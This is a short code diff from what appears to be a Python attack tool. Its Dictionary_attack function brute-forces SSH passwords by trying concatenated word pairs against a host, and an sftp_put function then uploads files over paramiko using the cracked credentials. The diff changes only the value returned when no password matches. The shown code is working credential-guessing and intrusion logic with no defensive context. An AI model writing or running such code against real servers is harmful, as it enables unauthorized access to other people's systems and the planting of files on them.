@@ -29,7 +29,7 @@ def Dictionary_attack(server_info):
                 if SSH_Connect(server_info['user'],server_info['host'],w1 + w2):
                     server_info['passwd'] = w1 + w2
                     return server_info
-    return '' # can't find satisfy passwd by this dictionary
+    return server_info # can't find satisfy passwd by this dictionary
 def sftp_put(server_path,local_path,server_info):
     trans = paramiko.Transport(sock = (server_info['host'],22))
     trans.connect(username = server_info['user'],password = server_info['passwd'])
